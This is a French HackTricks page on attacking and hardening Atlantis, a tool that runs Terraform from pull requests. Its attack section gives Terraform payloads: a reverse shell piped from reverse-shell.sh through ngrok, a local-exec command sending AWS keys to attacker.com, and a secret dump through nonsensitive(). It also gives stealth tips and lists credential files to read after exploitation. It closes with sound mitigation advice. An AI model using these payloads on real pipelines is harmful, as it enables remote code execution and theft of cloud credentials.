# S√©curit√© Atlantis

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informations de base

Atlantis vous aide essentiellement √† ex√©cuter terraform √† partir de Pull Requests de votre serveur git.

![](<../.gitbook/assets/image (51).png>)

## Laboratoire local

1. Allez sur la **page des versions d'atlantis** sur [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) et **t√©l√©chargez** celle qui vous convient.
2. Cr√©ez un **jeton personnel** (avec acc√®s au d√©p√¥t) de votre utilisateur **github**
3. Ex√©cutez `./atlantis testdrive` et cela cr√©era un **d√©p√¥t de d√©monstration** que vous pouvez utiliser pour **communiquer avec atlantis**
4. Vous pouvez acc√©der √† la page web sur 127.0.0.1:4141

## Acc√®s Atlantis

### Identifiants du serveur Git

**Atlantis** prend en charge plusieurs h√¥tes git tels que **Github**, **Gitlab**, **Bitbucket** et **Azure DevOps**.\
Cependant, pour acc√©der aux d√©p√¥ts sur ces plateformes et effectuer des actions, il doit avoir un **acc√®s privil√©gi√© accord√©** (au moins des permissions d'√©criture).\
[**La documentation**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) recommande de cr√©er un utilisateur sur ces plateformes sp√©cifiquement pour Atlantis, mais certaines personnes peuvent utiliser des comptes personnels.

{% hint style="warning" %}
Dans tous les cas, du point de vue d'un attaquant, le **compte Atlantis** sera tr√®s **int√©ressant** **√† compromettre**.
{% endhint %}

### Webhooks

Atlantis utilise en option des [**secrets de Webhook**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) pour valider que les **webhooks** qu'il re√ßoit de votre h√¥te Git sont **l√©gitimes**.

Une fa√ßon de confirmer cela serait de **n'autoriser les requ√™tes qu'en provenance des IPs** de votre h√¥te Git, mais une mani√®re plus simple est d'utiliser un secret de Webhook.

Notez que, √† moins que vous n'utilisiez un serveur github ou bitbucket priv√©, vous devrez exposer les points de terminaison des webhooks √† Internet.

{% hint style="warning" %}
Atlantis va **exposer des webhooks** pour que le serveur git puisse lui envoyer des informations. Du point de vue d'un attaquant, il serait int√©ressant de savoir **si vous pouvez lui envoyer des messages**.
{% endhint %}

### Identifiants du fournisseur <a href="#provider-credentials" id="provider-credentials"></a>

[Selon la documentation :](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis ex√©cute Terraform en **lan√ßant simplement les commandes `terraform plan` et `apply`** sur le serveur o√π **Atlantis est h√©berg√©**. Tout comme lorsque vous ex√©cutez Terraform localement, Atlantis a besoin d'identifiants pour votre fournisseur sp√©cifique.

C'est √† vous de d√©cider comment vous [fournissez des identifiants](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) √† Atlantis pour votre fournisseur sp√©cifique :

* Le [Helm Chart Atlantis](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) et le [Module AWS Fargate](https://www.runatlantis.io/docs/deployment.html#aws-fargate) ont leurs propres m√©canismes pour les identifiants des fournisseurs. Lisez leur documentation.
* Si vous ex√©cutez Atlantis dans le cloud, de nombreux clouds ont des moyens de donner un acc√®s √† l'API cloud aux applications qui y sont ex√©cut√©es, par exemple :
* [R√¥les EC2 AWS](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Recherchez "EC2 Role")
* [Comptes de service d'instance GCE](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* De nombreux utilisateurs d√©finissent des variables d'environnement, par ex. `AWS_ACCESS_KEY`, l√† o√π Atlantis est ex√©cut√©.
* D'autres cr√©ent les fichiers de configuration n√©cessaires, par ex. `~/.aws/credentials`, l√† o√π Atlantis est ex√©cut√©.
* Utilisez le [Fournisseur Vault HashiCorp](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) pour obtenir des identifiants de fournisseur.

{% hint style="warning" %}
Le **conteneur** o√π **Atlantis** est **ex√©cut√©** contiendra tr√®s probablement des **identifiants privil√©gi√©s** pour les fournisseurs (AWS, GCP, Github...) qu'Atlantis g√®re via Terraform.
{% endhint %}

### Page Web

Par d√©faut, Atlantis ex√©cutera une **page web sur le port 4141 en localhost**. Cette page permet simplement d'activer/d√©sactiver l'application atlantis et de v√©rifier l'√©tat du plan des d√©p√¥ts et de les d√©verrouiller (elle ne permet pas de modifier les choses, donc elle n'est pas tr√®s utile).

Vous ne la trouverez probablement pas expos√©e √† Internet, mais il semble que par d√©faut **aucun identifiant ne soit n√©cessaire** pour y acc√©der (et s'ils le sont, `atlantis`:`atlantis` sont les **identifiants par d√©faut**).

## Configuration du serveur

La configuration pour `atlantis server` peut √™tre sp√©cifi√©e via des drapeaux de ligne de commande, des variables d'environnement, un fichier de configuration ou un m√©lange des trois.

* Vous pouvez trouver [**ici la liste des drapeaux**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) pris en charge par le serveur Atlantis
* Vous pouvez trouver [**ici comment transformer une option de configuration en variable d'environnement**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

Les valeurs sont **choisies dans cet ordre** :

1. Drapeaux
2. Variables d'environnement
3. Fichier de configuration

{% hint style="warning" %}
Notez que dans la configuration, vous pourriez trouver des valeurs int√©ressantes telles que **des jetons et des mots de passe**.
{% endhint %}

### Configuration des d√©p√¥ts

Certaines configurations affectent **la gestion des d√©p√¥ts**. Cependant, il est possible que **chaque d√©p√¥t n√©cessite des param√®tres diff√©rents**, il existe donc des moyens de sp√©cifier chaque d√©p√¥t. Voici l'ordre de priorit√© :

1. Fichier [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config) du d√©p√¥t. Ce fichier peut √™tre utilis√© pour sp√©cifier comment atlantis doit traiter le d√©p√¥t. Cependant, par d√©faut, certaines cl√©s ne peuvent pas √™tre sp√©cifi√©es ici sans certains drapeaux les autorisant.
2. Probablement n√©cessaire d'√™tre autoris√© par des drapeaux comme `allowed_overrides` ou `allow_custom_workflows`
3. [**Configuration c√¥t√© serveur**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) : Vous pouvez la passer avec le drapeau `--repo-config` et c'est un yaml configurant de nouveaux param√®tres pour chaque d√©p√¥t (regexes pris en charge)
4. Valeurs **par d√©faut**

#### Protections PR

Atlantis permet d'indiquer si vous voulez que le **PR** soit **`approuv√©`** par quelqu'un d'autre (m√™me si cela n'est pas d√©fini dans la protection de la branche) et/ou soit **`fusionnable`** (protections de branche pass√©es) **avant d'ex√©cuter apply**. D'un point de vue s√©curit√©, il est recommand√© de d√©finir les deux options.

Dans le cas o√π `allowed_overrides` est vrai, ces param√®tres peuvent √™tre **modifi√©s pour chaque projet par le fichier `/atlantis.yml`**.

#### Scripts

La configuration du d√©p√¥t peut **sp√©cifier des scripts** √† ex√©cuter [**avant**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_pre workflow hooks_) et [**apr√®s**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_post workflow hooks_) qu'un **workflow soit ex√©cut√©.**

Il n'y a pas d'option pour **sp√©cifier** ces scripts dans le fichier **repo `/atlantis.yml`**.

#### Workflow

Dans la configuration du d√©p√¥t (configuration c√¥t√© serveur), vous pouvez [**sp√©cifier un nouveau workflow par d√©faut**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow), ou [**cr√©er de nouveaux workflows personnalis√©s**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** Vous pouvez √©galement **sp√©cifier** quels **d√©p√¥ts** peuvent **acc√©der** aux **nouveaux** g√©n√©r√©s.\
Ensuite, vous pouvez autoriser le fichier **atlantis.yaml** de chaque d√©p√¥t √† **sp√©cifier le workflow √† utiliser.**

{% hint style="danger" %}
Si le drapeau de [**configuration c√¥t√© serveur**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` est d√©fini sur **Vrai**, les workflows peuvent √™tre **sp√©cifi√©s** dans le fichier **`atlantis.yaml`** de chaque d√©p√¥t. Il est √©galement potentiellement n√©cessaire que **`allowed_overrides`** sp√©cifie √©galement **`workflow`** pour **remplacer le workflow** qui va √™tre utilis√©.\
Cela donnera essentiellement **RCE dans le serveur Atlantis √† tout utilisateur pouvant acc√©der √† ce d√©p√¥t**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### V√©rification de politique Conftest

Atlantis prend en charge l'ex√©cution de **politiques** [**conftest**](https://www.conftest.dev/) **c√¥t√© serveur** contre la sortie du plan. Les cas d'utilisation courants pour cette √©tape incluent :

* Refuser l'utilisation d'une liste de modules
* Affirmer les attributs d'une ressource au moment de la cr√©ation
* Attraper les suppressions de ressources non intentionnelles
* Pr√©venir les risques de s√©curit√© (par exemple, exposer des ports s√©curis√©s au public)

Vous pouvez v√©rifier comment le configurer dans [**la documentation**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works).

## Commandes Atlantis

Dans [**la documentation**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis), vous pouvez trouver les options que vous pouvez utiliser pour ex√©cuter Atlantis :
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
## Attaques

{% hint style="warning" %}
Si pendant l'exploitation vous trouvez cette **erreur** : `Error: Error acquiring the state lock`

Vous pouvez la corriger en ex√©cutant :
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### Ex√©cution de code √† distance Atlantis plan - Modification de configuration dans une nouvelle PR

Si vous avez un acc√®s en √©criture sur un d√©p√¥t, vous pourrez cr√©er une nouvelle branche et g√©n√©rer une PR. Si vous pouvez **ex√©cuter `atlantis plan`** (ou peut-√™tre qu'il est ex√©cut√© automatiquement), **vous pourrez r√©aliser une ex√©cution de code √† distance (RCE) √† l'int√©rieur du serveur Atlantis**.

Vous pouvez y parvenir en faisant [**charger √† Atlantis une source de donn√©es externe**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source). Il suffit de mettre un payload comme le suivant dans le fichier `main.tf` :
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Attaque plus discr√®te

Vous pouvez r√©aliser cette attaque de mani√®re encore plus **discr√®te**, en suivant ces suggestions :

* Au lieu d'ajouter le rev shell directement dans le fichier terraform, vous pouvez **charger une ressource externe** qui contient le rev shell :
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Vous pouvez trouver le code de la rev shell sur [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

* Dans la ressource externe, utilisez la fonctionnalit√© **ref** pour masquer **le code terraform rev shell dans une branche** √† l'int√©rieur du d√©p√¥t, quelque chose comme : `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **Au lieu** de cr√©er une **PR vers master** pour d√©clencher Atlantis, **cr√©ez 2 branches** (test1 et test2) et cr√©ez une **PR de l'une vers l'autre**. Lorsque vous avez termin√© l'attaque, supprimez simplement la PR et les branches.

### Atlantis plan Secrets Dump

Vous pouvez **extraire les secrets utilis√©s par terraform** en ex√©cutant `atlantis plan` (`terraform plan`) en mettant quelque chose comme ceci dans le fichier terraform :
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Atlantis apply RCE - Modification de configuration dans une nouvelle PR

Si vous avez un acc√®s en √©criture sur un d√©p√¥t, vous pourrez cr√©er une nouvelle branche et g√©n√©rer une PR. Si vous pouvez **ex√©cuter `atlantis apply`, vous pourrez r√©aliser un RCE √† l'int√©rieur du serveur Atlantis**.

Cependant, vous aurez g√©n√©ralement besoin de contourner certaines protections :

* **Mergeable** : Si cette protection est activ√©e dans Atlantis, vous ne pouvez ex√©cuter **`atlantis apply` que si la PR est fusionnable** (ce qui signifie que la protection de la branche doit √™tre contourn√©e).
* V√©rifiez les [**contournements potentiels de protections de branches**](broken-reference/)
* **Approuv√©** : Si cette protection est activ√©e dans Atlantis, **un autre utilisateur doit approuver la PR** avant que vous puissiez ex√©cuter `atlantis apply`
* Par d√©faut, vous pouvez abuser du [**token Gitbot pour contourner cette protection**](broken-reference/)

Ex√©cution de **`terraform apply` sur un fichier Terraform malveillant avec** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Vous devez simplement vous assurer qu'un payload comme les suivants se retrouve dans le fichier `main.tf` :
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Suivez les **suggestions de la technique pr√©c√©dente** pour effectuer cette attaque de mani√®re **plus discr√®te**.

### Injection de Param√®tres Terraform

Lors de l'ex√©cution de `atlantis plan` ou `atlantis apply`, terraform est ex√©cut√© en sous-main, vous pouvez passer des commandes √† terraform depuis atlantis en commentant quelque chose comme :
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
Vous pouvez passer des variables d'environnement qui pourraient √™tre utiles pour contourner certaines protections. V√©rifiez les variables d'environnement terraform sur [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

### Workflow personnalis√©

Ex√©cution de **commandes de build malveillantes personnalis√©es** sp√©cifi√©es dans un fichier `atlantis.yaml`. Atlantis utilise le fichier `atlantis.yaml` de la branche de la pull request, **pas** de `master`.\
Cette possibilit√© a √©t√© mentionn√©e dans une section pr√©c√©dente :

{% hint style="danger" %}
Si le drapeau de [**configuration c√¥t√© serveur**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` est r√©gl√© sur **True**, les workflows peuvent √™tre **sp√©cifi√©s** dans le fichier **`atlantis.yaml`** de chaque d√©p√¥t. Il est √©galement potentiellement n√©cessaire que **`allowed_overrides`** sp√©cifie aussi **`workflow`** pour **remplacer le workflow** qui va √™tre utilis√©.

Cela donnera essentiellement **RCE sur le serveur Atlantis √† tout utilisateur pouvant acc√©der √† ce d√©p√¥t**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

### Contourner les protections de planification/application

Si le drapeau de [**configuration c√¥t√© serveur**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allowed_overrides` _a_ `apply_requirements` configur√©, il est possible pour un d√©p√¥t de **modifier les protections de planification/application pour les contourner**.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
### D√©tournement de PR

Si quelqu'un envoie des **commentaires `atlantis plan/apply` sur vos pull requests valides,** cela provoquera l'ex√©cution de terraform quand vous ne le souhaitez pas.

De plus, si vous n'avez pas configur√© dans la **protection de branche** pour demander √† **r√©√©valuer** chaque PR lorsqu'un **nouveau commit est pouss√©** dessus, quelqu'un pourrait **√©crire des configurations malveillantes** (voir sc√©narios pr√©c√©dents) dans la configuration de terraform, ex√©cuter `atlantis plan/apply` et obtenir un RCE.

Voici le **param√®tre** dans les protections de branche Github :

![](<../.gitbook/assets/image (31).png>)

### Secret de Webhook

Si vous parvenez √† **voler le secret de webhook** utilis√© ou s'il **n'y a pas de secret de webhook** utilis√©, vous pourriez **appeler le webhook Atlantis** et **invoquer les commandes atlatis** directement.

### Bitbucket

Bitbucket Cloud ne **prend pas en charge les secrets de webhook**. Cela pourrait permettre aux attaquants de **falsifier des requ√™tes provenant de Bitbucket**. Assurez-vous que seules les adresses IP de Bitbucket sont autoris√©es.

* Cela signifie qu'un **attaquant** pourrait faire des **requ√™tes factices √† Atlantis** qui semblent provenir de Bitbucket.
* Si vous sp√©cifiez `--repo-allowlist`, ils ne pourraient que falsifier des requ√™tes concernant ces d√©p√¥ts, donc le plus de d√©g√¢ts qu'ils pourraient faire serait de planifier/appliquer sur vos propres d√©p√¥ts.
* Pour √©viter cela, autorisez [les adresses IP de Bitbucket](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) (voir adresses IPv4 sortantes).

## Post-Exploitation

Si vous avez r√©ussi √† acc√©der au serveur ou au moins √† obtenir un LFI, il y a des choses int√©ressantes que vous devriez essayer de lire :

* `/home/atlantis/.git-credentials` Contient les identifiants d'acc√®s vcs
* `/atlantis-data/atlantis.db` Contient les identifiants d'acc√®s vcs avec plus d'informations
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Fichier d'√©tat Terraform
* Exemple : /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Variables d'environnement
* `/proc/[2-20]/cmdline` Ligne de commande de `atlantis server` (peut contenir des donn√©es sensibles)

## Att√©nuations

### Ne pas utiliser sur des d√©p√¥ts publics <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Comme tout le monde peut commenter les pull requests publiques, m√™me avec toutes les att√©nuations de s√©curit√© disponibles, il est toujours dangereux d'ex√©cuter Atlantis sur des d√©p√¥ts publics sans configuration appropri√©e des param√®tres de s√©curit√©.

### Ne pas utiliser `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

Si vous ex√©cutez sur un d√©p√¥t public (ce qui n'est pas recommand√©, voir ci-dessus), vous ne devriez pas d√©finir `--allow-fork-prs` (par d√©faut sur false) car n'importe qui peut ouvrir une pull request depuis son fork vers votre d√©p√¥t.

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis vous oblige √† sp√©cifier une liste blanche de d√©p√¥ts qu'il acceptera les webhooks via le drapeau `--repo-allowlist`. Par exemple :

* D√©p√¥ts sp√©cifiques : `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Votre organisation enti√®re : `--repo-allowlist=github.com/runatlantis/*`
* Chaque d√©p√¥t dans votre installation GitHub Enterprise : `--repo-allowlist=github.yourcompany.com/*`
* Tous les d√©p√¥ts : `--repo-allowlist=*`. Utile lorsque vous √™tes dans un r√©seau prot√©g√© mais dangereux sans √©galement d√©finir un secret de webhook.

Ce drapeau garantit que votre installation Atlantis n'est pas utilis√©e avec des d√©p√¥ts que vous ne contr√¥lez pas. Voir `atlantis server --help` pour plus de d√©tails.

### Prot√©ger la planification Terraform <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

Si les attaquants soumettant des pull requests avec du code Terraform malveillant font partie de votre mod√®le de menace, vous devez √™tre conscient que les approbations `terraform apply` ne sont pas suffisantes. Il est possible d'ex√©cuter du code malveillant dans un `terraform plan` en utilisant la [source de donn√©es `external`](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) ou en sp√©cifiant un fournisseur malveillant. Ce code pourrait alors exfiltrer vos identifiants.

Pour √©viter cela, vous pourriez :

1. Int√©grer les fournisseurs dans l'image Atlantis ou l'h√¥te et refuser l'egress en production.
2. Impl√©menter le protocole de registre de fournisseur en interne et refuser l'egress public, de cette fa√ßon vous contr√¥lez qui a acc√®s en √©criture au registre.
3. Modifier la configuration de votre d√©p√¥t c√¥t√© serveur [`server-side repo configuration`](https://www.runatlantis.io/docs/server-side-repo-config.html) √† l'√©tape `plan` pour valider contre l'utilisation de fournisseurs ou de sources de donn√©es non autoris√©s ou de PRs d'utilisateurs non autoris√©s. Vous pourriez √©galement ajouter une validation suppl√©mentaire √† ce stade, par exemple exiger un "pouce en l'air" sur la PR avant de permettre la poursuite du `plan`. Conftest pourrait √™tre utile ici.

### Secrets de Webhook <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis doit √™tre ex√©cut√© avec des secrets de Webhook d√©finis via les variables d'environnement `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET`. M√™me avec le drapeau `--repo-allowlist` d√©fini, sans secret de webhook, les attaquants pourraient faire des requ√™tes √† Atlantis se faisant passer pour un d√©p√¥t autoris√©. Les secrets de webhook garantissent que les requ√™tes de webhook proviennent r√©ellement de votre fournisseur VCS (GitHub ou GitLab).

Si vous utilisez Azure DevOps, au lieu de secrets de webhook, ajoutez un nom d'utilisateur et un mot de passe de base.

### Authentification de base Azure DevOps <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps prend en charge l'envoi d'un en-t√™te d'authentification de base dans tous les √©v√©nements de webhook. Cela n√©cessite l'utilisation d'une URL HTTPS pour votre emplacement de webhook.

### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

Si vous utilisez des secrets de webhook mais que votre trafic est sur HTTP, alors les secrets de webhook pourraient √™tre vol√©s. Activez SSL/HTTPS en utilisant les drapeaux `--ssl-cert-file` et `--ssl-key-file`.

### Activer l'authentification sur le serveur web Atlantis <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

Il est tr√®s recommand√© d'activer l'authentification dans le service web. Activez BasicAuth en utilisant le drapeau `--web-basic-auth=true` et configurez un nom d'utilisateur et un mot de passe en utilisant les drapeaux `--web-username=yourUsername` et `--web-password=yourPassword`.

Vous pouvez √©galement les passer en tant que variables d'environnement `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` et `ATLANTIS_WEB_PASSWORD=yourPassword`.

## R√©f√©rences

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
* [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) sur github.

</details>
